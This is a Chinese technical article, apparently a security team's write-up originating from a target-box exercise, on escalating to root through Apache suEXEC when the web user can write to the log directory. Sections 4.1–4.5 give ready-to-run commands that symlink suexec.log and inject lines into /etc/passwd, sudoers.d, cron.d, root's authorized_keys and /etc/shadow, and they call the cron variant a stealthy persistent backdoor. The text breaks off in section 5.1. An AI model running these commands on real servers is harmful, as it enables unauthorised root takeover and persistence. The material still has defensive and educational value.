---
title: Apache su EXEC 日志目录可写导致的 SUID 提权漏洞
url: https://mp.weixin.qq.com/s/YnJ08eUTx1_v2_RxDu7VuA
source: Doonsec's feed
date: 2026-07-13
fetch_date: 2026-07-14T04:44:22.775334
---

# Apache su EXEC 日志目录可写导致的 SUID 提权漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1E8ULvdwpfP3OuZpeUg2icmTDHoFiahpWC8iaZ4dwXqkBgOO1kjyn5KDBibJaHU2PRadz55GZcibDvlmsibFCHJE5ibYGZ31e7wjia53SkfzjKkVRko/0?wx_fmt=jpeg)

# Apache su EXEC 日志目录可写导致的 SUID 提权漏洞

MazeSec
MazeSec

泷羽Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 摘要

Apache suEXEC 是一种允许 CGI/SSI 程序以不同于 Web 服务器用户身份运行的安全机制，其包装器二进制文件通常以 `setuid root` 权限安装。然而，当日志目录被错误配置为 Web 服务用户可写时，攻击者可通过符号链接劫持 suEXEC 日志文件，实现任意文件追加写入，最终完成从 Web 权限到系统 root 权限的完整提权。

---

## 1. 引言

在共享主机（Shared Hosting）和多租户 Web 环境中，Apache suEXEC 被广泛用于隔离不同用户的 CGI 进程，防止某一用户的恶意脚本影响其他租户或整个系统。suEXEC 并非 Linux 系统原生的 SUID 工具，而是 **Apache HTTP Server 的一个可选模块**，其包装器二进制文件（`suexec`）在安装 Apache 时通过编译选项 `--enable-suexec` 启用，并以 `setuid root` 权限安装。suEXEC 包装器在执行用户指定的 CGI 程序前，会执行一系列严格的安全检查，包括验证目标用户/组 ID、检查文件路径是否位于允许的文档根目录内，以及确保程序文件本身未被全局可写。通过这些机制，suEXEC 试图在便利性与安全性之间取得平衡。

然而，安全机制的强度往往取决于其最薄弱的环节。suEXEC 在运行期间需要记录审计日志和错误信息，这些日志默认存放于 `/var/log/apache2/suexec.log`（具体路径取决于编译时的 `--with-suexec-logfile` 选项）。Apache 官方文档明确警告："任何人若能写入 Apache 日志文件所在的目录，几乎必然能够获得服务器启动时所使用的 UID（通常是 root）的访问权限。" 这一警告并非危言耸听——当日志目录的权限配置偏离安全基线时，suEXEC 的 `setuid root` 特性将从安全资产转变为攻击者的提权跳板。

**致谢：** 本研究源于 MazeSec 团队内部靶机攻防演练。笔者在设计靶机「Oauth」时，主要预期解法为 john 日志写入的利用；感谢 顾顾顾 同学在打靶过程中发现了这一基于 suEXEC 日志目录权限配置错误的非预期提权路径，为本文提供了关键的实战案例与验证环境。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfNwAYWKImFP3kIyrvaXabMKZaZ8uaChTicOZ9hAFPMYOMMJ97ryVY136HzyaMRQFiaEu8UhYtPROMRFeQptVt4UvfhRfIOYgxJ40/640?wx_fmt=png&from=appmsg)

---

## 2. suEXEC 机制与 SUID 权限模型

### 2.1 suEXEC 的设计目标与运行原理

suEXEC 的核心目标是解决 Web 服务器默认以低权限用户（如 `www-data`、`apache`）运行，而用户 CGI 脚本又需要以文件所有者身份执行之间的矛盾。通过 suEXEC，Apache 可以在收到 CGI 请求时，派生出一个以目标用户身份运行的子进程来执行脚本，而非直接使用主服务器的权限。

suEXEC 包装器（`suexec` 二进制文件）必须以 `setuid root` 权限安装，因为只有 root 用户才能调用 `setuid()` 和 `setgid()` 系统调用将进程的有效用户/组 ID 切换为任意目标值。Apache 官方文档指出，如果服务器启动时未找到正确配置且 `setuid root` 的 suEXEC 包装器，则 suEXEC 机制不会被启用。这种设计使得 suEXEC 成为了系统中少数几个以 root 权限暴露给 Web 服务用户的接口之一。

### 2.2 日志机制的安全敏感性

suEXEC 在编译时通过 `--with-suexec-logfile` 选项指定日志文件路径，运行时通过 `fopen(LOG_EXEC, "a")` 以追加模式打开日志文件。在 suEXEC 的源代码实现中，日志写入操作由 `log_err()` 和 `err_output()` 函数完成，这些函数在发生安全检查失败或执行异常时被调用，将包含时间戳、错误描述以及部分命令行上下文的日志条目写入指定文件。

由于 suEXEC 包装器以 root 权限运行，其对日志文件的写入操作同样以 root 权限进行。这意味着，无论日志文件的实际路径被重定向到何处，写入操作都会绕过目标文件的常规权限检查（DAC），直接以 root 身份完成追加。这种"高权限写入低权限路径"的设计，在日志目录受控的情况下是安全的；但一旦目录控制权旁落，就会演变为任意文件写入漏洞。

---

## 3. 漏洞成因与配置缺陷分析

### 3.1 安全基线与错误配置的对比

在默认的安全配置下，Apache 日志目录（/var/log/apache2）的权限应严格限制：

```
# 默认安全配置
drwxr-x--- 2 root wheel 4096 May 3012:46 .
drwxr-xr-x 3 root root  4096 May 3012:46 ..
```

此配置中，日志目录的所有者为 `root`，所属组为 `wheel`（或 `adm`），且仅允许所有者读取、写入和列出目录内容，组用户仅允许读取和执行。Web 服务用户（`www-data` 或 `apache`）不属于 `wheel` 组，因此无法在该目录内创建、删除或修改文件。

然而，在某些场景下——例如为了方便 Web 服务自身轮转日志、或是误操作将日志目录所有权授予了 Web 用户——配置可能演变为如下危险状态：

```
# 错误配置（存在漏洞）
drwxr-s--- 2 apache apache 4096 Feb 2519:46 .
drwxr-xr-x 3 root   root   4096 May  810:51 ..
-rw-r--r-- 1 apache apache    0 May  810:56 access.log
-rw-r--r-- 1 apache apache  588 May 3012:18error.log
```

在此配置中，目录的属主和属组均为 `apache`，且权限位为 `rwxr-s---`。这意味着 `apache` 用户对该目录拥有完整的读、写、执行权限，包括删除现有文件和创建新文件（包括符号链接）。SGID 位（`s`）的存在虽然会确保新建文件继承目录的属组，但并不能阻止符号链接攻击的发生。

### 3.2 符号链接攻击的通用原理

符号链接攻击（Symlink Attack）是一种经典的 UNIX 文件系统漏洞利用技术。其基本原理是：攻击者在一个自己拥有写权限的目录中创建一个符号链接，使其指向一个自己无权直接写入的目标文件；随后诱使一个以更高权限运行的进程向该符号链接路径写入数据。由于进程在打开文件时通常跟随符号链接（除非显式使用 `O_NOFOLLOW` 标志），写入操作最终会作用于目标文件，从而实现权限提升。

Apache 官方安全文档对此有明确警告："如果日志目录可被非 root 用户写入，攻击者可以将日志文件替换为指向系统其他文件的符号链接，随后 root 可能会用任意数据覆盖该文件。" 这一警告与本文讨论的 suEXEC 场景高度吻合，只是 suEXEC 的 `setuid root` 特性使得攻击更加直接——攻击者无需等待 root 用户主动写入，而是可以直接调用 suEXEC 触发 root 权限的写入操作。

### 3.3 suexec.c中的换行注入产生原理

suexec.c 换行注入成因是：将含换行符的用户可控输入，未经过滤直接传入格式化日志函数，`vfprintf` 原样输出导致日志分行，实现恶意日志伪造。

分析源码可以看到：
![](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfPv6VJOwGicJ9aIVRvERiaQa068EJwPLIPNDmuOWAPrdEJhW5vZFhy11ich1Ek9TpD8icqn2iaTwnu9Ma4DeicaWD5BADGeorsqJs9ibA/640?wx_fmt=png&from=appmsg)
![](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfPKAHpjJVG1qESFnyKvDVsl5bMr4Fgpgu1hdeib1XIcwc6x3Rw8B9UHChHdgZJDfWKwNs7icFariaibib9lkgOkVcrhoZ3F3N3y7D7I/640?wx_fmt=png&from=appmsg)

1. 日志输出核心（`err_output`）

```
staticvoid err_output(int is_error, const char *fmt, va_list ap) {
// ... 日志打开、时间戳拼接 ...
    vfprintf(log, fmt, ap);  // 关键漏洞点：无字符过滤，原样输出
    fflush(log);
}
```

2. 错误日志封装（`log_err`）

```
staticvoid log_err(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    err_output(1, fmt, ap);  // 透传格式化串与参数
    va_end(ap);
}
```

3. 漏洞触发点（命令校验失败）

```
// 检测到非法命令，直接将用户可控 cmd 写入日志
log_err("invalid command (%s)\n", cmd);
```

由于输入可控，未对外部输入做字符 sanitize（过滤换行、回车、控制符），我们可构造恶意命令参数，在合法路径后插入 `\n` 换行符，例如：

```
/tmp/attack\n[2026-05-3010:00:00]: INFO: legitimate operation
```

`log_err("invalid command (%s)\n", cmd)` 中，`%s` 被替换为含 `\n` 的恶意字符串，`vfprintf` 直接解析换行。

单独看，换行注入仅是一种日志污染技巧，但在符号链接劫持的上下文中，攻击者利用 suEXEC 的 root 写入权限，可以将原本只能影响日志外观的换行符，转化为影响系统核心配置文件的结构性修改。

---

## 4. 多种利用方式详解

### 4.1 写入 `/etc/passwd`

这是最直接的提权方式。攻击者通过 suEXEC 的日志写入机制，向 `/etc/passwd` 追加一个格式合法的 root 用户条目，随后通过 `su` 命令切换至该用户完成提权。

**利用命令：**

```
# 第一步：清除原有日志，创建指向 /etc/passwd 的符号链接
rm /var/log/apache2/suexec.log
ln -svf /etc/passwd /var/log/apache2/suexec.log

# 第二步：触发 suEXEC 写入恶意 passwd 条目
/usr/sbin/suexec root root $'\nll:aacFCuAIHhrCM:0:0::/root:/bin/bash\n'
```

**写入效果：**

suEXEC 的 `log_err()` 函数会将命令行参数原样写入日志。攻击者利用 Bash 的 `$'...'` ANSI-C 引号扩展语法注入换行符（`\n`），使得写入内容在 `/etc/passwd` 中表现为一个独立的记录行：

```
ll:aacFCuAIHhrCM:0:0::/root:/bin/bash
```

该条目结构完全符合 `/etc/passwd` 格式规范：

* `ll`

  ：用户名
* `aacFCuAIHhrCM`

  ：DES 密码哈希（可通过 `openssl passwd -crypt` 自定义生成）
* `0:0`

  ：UID 与 GID 均为 root
* `/root`

  ：家目录
* `/bin/bash`

  ：登录 shell

**验证提权：**

```
grep '^ll:' /etc/passwd
su ll
# 输入密码后获得 root shell
whoami  # root
id      # uid=0(root) gid=0(root)
```

![](https://mmbiz.qpic.cn/mmbiz_png/1E8ULvdwpfMYbDpoZSBk2ZtoeEYVxLPy8oe7VBRqdYhE7iaExBDhdWj2Ko5PwMU9XibFSD1YzEBU5DJRs305tOxPavK6KHt3oUHAeTFddDtRY/640?wx_fmt=png&from=appmsg)

### 4.2 写入 `/etc/sudoers.d/`

相比 `/etc/passwd` 的显式用户创建，向 `/etc/sudoers.d/` 写入配置文件更为隐蔽。攻击者无需创建新用户，而是直接为已有的 Web 服务用户（如 `apache`）授予无密码 sudo 权限。

**利用命令：**

```
rm /var/log/apache2/suexec.log
ln -svf /etc/sudoers.d/apache /var/log/apache2/suexec.log
/usr/sbin/suexec root root $'\napache ALL=(ALL) NOPASSWD: ALL\n'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfNEldHNQqfXjcuAWnniaVlX1ePswcQ9pdldsU94uV40Q5Hbx4cNs2J7feC2j2KPPOzL53Ze81XhRyCsBLTXdrM8gqlcKj3JZZYg/640?wx_fmt=png&from=appmsg)

**效果：** `apache` 用户可在任何终端通过 `sudo -S` 或交互式 `sudo` 直接执行 root 命令，无需密码验证。由于 `/etc/sudoers.d/` 目录下的配置文件通常由自动化工具管理，新增一个 `apache` 文件不易引起管理员警觉。

### 4.3 写入计划任务

通过向 `/etc/cron.d/` 写入定时任务，攻击者可以建立一个延迟触发的持久化后门，即使当前 webshell 被清理，仍可在未来某个时间点自动获取 root 权限。

**利用命令：**

```
rm /var/log/apache2/suexec.log
ln -svf /etc/cron.d/svcupdate /var/log/apache2/suexec.log
/usr/sbin/suexec root root $'\n* * * * * root chmod u+s /bin/bash\n'
```

**效果：** 每分钟执行一次 `chmod u+s /bin/bash`，为 `/bin/bash` 添加 SUID 位。攻击者随后可通过 `/bin/bash -p` 启动一个保留有效 UID 的 shell，直接获得 root 权限。

### 4.4 写入免密 SSH 登录

攻击者将自己的 SSH 公钥追加到 root 用户的 `authorized_keys` 文件中，实现无需密码、无需交互的远程 root 登录。

**利用命令：**

```
rm /var/log/apache2/suexec.log
ln -svf /root/.ssh/authorized_keys /var/log/apache2/suexec.log
/usr/sbin/suexec root root $'\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@kali\n'
```

**效果：** 攻击者可直接通过 SSH 以 root 身份登录目标服务器：

```
ssh -i ~/.ssh/id_rsa root@target.ip
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1E8ULvdwpfMckJKLP2k6Vr1RibT7hX1lria3iaZWibCTWF6465WtZ8vSZdgicZsU48xQF9Aya8NUC1cAQPTlSq8EZNnFib9Bkicn0degR6KbvGbXibw/640?wx_fmt=png&from=appmsg)

### 4.5 写入 `/etc/shadow`

虽然 `/etc/shadow` 默认权限为 `000`，但 root 权限的追加写入不受 DAC 限制。攻击者可向 shadow 文件追加一个已知密码哈希的 root 条目，覆盖或补充现有 root 账户的认证凭据。

**利用命令：**

```
rm /var/log/apache2/suexec.log
ln -svf /etc/shadow /var/log/apache2/suexec.log
/usr/sbin/suexec root root $'\nroot:$6$rounds=5000$saltsalt$encryptedhash:0:0:99999:7:::\n'
```

**效果：** 直接修改 root 用户的密码哈希，攻击者可通过 `su -` 或 SSH 密码认证登录。此方式风险较高，因为错误的 shadow 格式可能导致系统所有用户无法登录，通常仅在攻击者希望彻底接管系统且不在乎被发现时使用。

---

## 5. 攻击链深度剖析

### 5.1 攻击前提条件

上述所有利用方式的成功，只需要依赖一个前置条件，即**Web 服务用户对日志目录有写权限** ，攻击者能以 `apache`/`www-data` 身份...